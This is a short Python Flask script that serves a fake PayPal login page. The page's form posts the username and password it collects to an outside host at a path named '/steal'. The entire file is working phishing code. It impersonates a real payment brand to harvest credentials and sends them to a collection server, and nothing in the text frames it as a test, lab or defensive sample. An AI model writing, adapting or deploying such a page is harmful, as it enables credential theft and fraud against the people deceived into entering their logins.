from flask import Flask

app = Flask(__name__)

FAKE_LOGIN_HTML = """
<html>
<head><title>PayPal - Secure Login</title></head>
<body>
<h1>PayPal</h1>
<form action="http://data-collector-xyz.com/steal" method="post">
    Username: <input type="text" name="username">
    Password: <input type="password" name="password">
    <input type="submit" value="Log In">
</form>
</body>
</html>
"""

@app.route("/")
def fake_login_page():
    return FAKE_LOGIN_HTML

if __name__ == "__main__":
    app.run(port=5000)